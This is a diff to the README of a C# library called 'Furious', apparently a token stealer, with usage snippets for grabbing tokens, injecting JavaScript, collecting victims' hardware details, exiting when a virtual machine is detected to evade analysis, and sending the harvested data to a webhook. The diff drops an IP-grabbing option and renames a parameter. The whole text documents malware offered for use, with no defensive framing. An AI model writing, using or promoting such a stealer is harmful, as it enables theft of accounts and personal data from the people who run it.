@@ -15,12 +15,10 @@ Build the DLL and reference it in your project(s): ```using Furious;```
 
 #### To grab tokens call
 ```Furious.Grabber.QuickStart(true);```
-#### To obtain IP address
-```Furious.Grabber.QuickStart(injectJS, grabIP: true);```
 #### To collect hardware information
-```Furious.Grabber.QuickStart(injectJS, grabIP, grabHardware: true);```
+```Furious.Grabber.QuickStart(injectJS, getUserHardware: true);```
 #### To check for a virtual machine
-```Furious.Grabber.QuickStart(injectJS, grabIP, grabHardware, checkForVM: true);``` - if a VM is detected, the application will close instantly.
+```Furious.Grabber.QuickStart(injectJS, getUserHardware, checkForVM: true);``` - if a VM is detected, the application will close instantly.
 #### To send data (hardware, ip etc.) to webhook
 ```Furious.Grabber.SendData(await Grabber.GetHardware());```
 # Requests
